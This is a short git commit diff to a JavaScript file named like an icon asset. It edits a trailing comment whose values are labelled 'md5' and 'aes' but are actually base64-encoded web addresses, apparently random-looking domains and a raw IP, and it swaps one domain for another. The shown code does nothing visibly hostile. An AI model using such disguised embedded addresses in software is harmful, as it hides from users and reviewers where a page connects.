cd50644828729b4999e6ea7c6c423aec771581a7
caocaodage <caocaodajun@gmail.com>
2023-03-22 17:44:15 +0800

    init

--- js/icon_3cbumk.js
+++ js/icon_3cbumk.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cudmpycXdlanFqa2phLmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cDovL3d3dy5idmphZWZpci5jb20vIy8=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
